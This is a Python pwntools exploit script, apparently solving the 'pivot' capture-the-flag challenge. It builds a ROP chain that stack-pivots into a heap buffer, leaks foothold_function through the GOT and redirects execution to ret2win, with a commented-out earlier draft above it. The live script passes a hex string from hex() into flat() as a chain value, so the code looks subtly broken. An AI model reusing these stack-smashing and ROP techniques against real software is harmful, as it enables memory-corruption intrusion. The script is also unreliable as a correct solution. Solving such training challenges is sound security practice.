# from pwn import *

# exe = context.binary = ELF("./pivot",checksec=False)
# context.log_level = 'debug'
# pty = process.PTY

# def start(argv=[], *a, **kw):
#     '''Start the exploit against the target.'''
#     if args.GDB:
#         return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
#     else:
#         return process([exe] + argv, *a, **kw)

# offset = 40

# foothold_plt = 0x400850
# foothold_got = 0x602048
# ret2win_offset = 0x14e
# # 0x400b00: pop rax; ret;
# pop_rax = 0x400b00
# # 0x400b02: xchg rax, rsp; ret;
# xchg_rax_rsp = 0x400b02
# # 0x400b05: mov rax, qword ptr [rax]; ret;
# mov_rax_ptr_rax = 0x400b05
# # 0x400900: pop rbp; ret;
# pop_rbp = 0x400900
# # 0x400b09: add rax, rbp; ret;
# add_rax_rbp = 0x400b09
# # 0x40098e: call rax;
# call_rax = 0x40098e

# heap_payload = flat(
#     foothold_plt,
#     pop_rax,
#     foothold_got,
#     mov_rax_ptr_rax,
#     pop_rbp,
#     ret2win_offset,
#     add_rax_rbp,
#     call_rax
# )

# p = process(stdin=PTY,stdout=PTY)
# # p.clean()
# # pivot_addr = int(p.recvuntil('pivot: ').strip(),16)
# p.recvuntil("pivot: ")
# pivot_addr = int(p.recvuntil("\n").strip(), 16)
# print(hex(pivot_addr))
# # pivot_addr = int(re.search(r"(0x[\w\d]+)", p.recvS()).group(0), 16)


# p.sendline(heap_payload)

# stack_smash_and_pivot = flat(
#     asm('nop') * offset,
#     pop_rax,
#     pivot_addr,
#     xchg_rax_rsp
# )
# # p.sendlineafter('>', stack_smash_and_pivot)
# # p.recvuntil("Now please send your stack smash")
# p.recvuntil('>')
# p.sendline(stack_smash_and_pivot)
# #p.interactive()
# # p.sendlineafter('>', stack_smash)
# # p.recvlines(2)
# # leaked_got_addr = p.recv()
# # foothold_leaked = unpack(leaked_got_addr[:4].strip())

from pwn import *
exe = context.binary = ELF("pivot", checksec=False)
lib = ELF('libpivot.so',checksec=False)
ropper = ROP(exe)
# libc = ELF('')
# ld = ELF('libpivot.so')
context.log_level = 'info'
offset = 40

#basically nullifies ASLR
# ret2win_offset = 0x14e #offset distance from foothold_function
ret2win_offset = hex(lib.symbols['ret2win'] - lib.symbols['foothold_function'])
print(hex(lib.symbols['ret2win'] - lib.symbols['foothold_function']))
# pop_rax_gadget = 0x400b00
# pop_rbp_gadget = 0x400900
pop_rax_gadget = ropper.find_gadget(["pop rax", "ret"])[0]
pop_rbp_gadget = ropper.find_gadget(["pop rbp", "ret"])[0]
add_rax_rbp_gadget = 0x0400b09
call_rax_gadget = 0x040098e
mov_rax_addr_rax_gadget = 0x0400b05
foothold_function_plt = exe.plt['foothold_function']
foothold_function_got = exe.got['foothold_function']
print("\n")
print(type(foothold_function_got))

heap_payload = flat(
    foothold_function_plt,
    pop_rax_gadget,
    foothold_function_got,
    mov_rax_addr_rax_gadget,
    pop_rbp_gadget,
    ret2win_offset,
    add_rax_rbp_gadget,
    call_rax_gadget
)

# p = process([ld.path,exe.path], env={"LD_PRELOAD": libc.path})
p = process()
p.recvuntil(b'pivot: ')
heap_addr = int(p.recvline().strip().decode(), 16)
p.recvuntil(b'>')
print("\nHeap address is -- " + str(hex(heap_addr)))
p.send(heap_payload)

xchg_rax_rsp_gadget = 0x0400b02

stack_payload = flat(
    asm('nop') * offset,
    pop_rax_gadget,
    heap_addr,
    xchg_rax_rsp_gadget,
)

p.recvuntil(b'>')
p.send(stack_payload)

p.interactive()
